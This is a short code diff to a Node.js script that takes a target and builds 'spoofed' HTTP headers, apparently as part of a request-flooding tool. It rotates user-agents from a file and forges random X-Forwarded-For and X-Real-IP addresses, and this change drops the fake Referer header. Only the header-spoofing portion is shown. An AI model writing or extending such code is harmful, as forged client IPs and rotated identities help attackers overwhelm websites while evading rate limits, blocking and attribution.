@@ -7,18 +7,15 @@ if (!target) {
   process.exit(1);
 }
 
-// Load user-agents and referers
+// Load user-agents
 const userAgents = fs.readFileSync('ua.txt', 'utf-8').split('\n').filter(Boolean);
-const referers = fs.readFileSync('refs.txt', 'utf-8').split('\n').filter(Boolean);
 
 // Spoofed headers template
 function getSpoofedHeaders() {
   const ua = userAgents[Math.floor(Math.random() * userAgents.length)];
-  const ref = referers[Math.floor(Math.random() * referers.length)];
 
   return {
     'User-Agent': ua,
-    'Referer': ref,
     'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
     'Accept-Language': 'en-US,en;q=0.9',
     'Upgrade-Insecure-Requests': '1',
@@ -26,8 +23,8 @@ function getSpoofedHeaders() {
     'Connection': 'keep-alive',
     'Cache-Control': 'no-cache',
     'Pragma': 'no-cache',
-    'X-Forwarded-For': `${randomIP()}`,
-    'X-Real-IP': `${randomIP()}`,
+    'X-Forwarded-For': randomIP(),
+    'X-Real-IP': randomIP(),
   };
 }
 
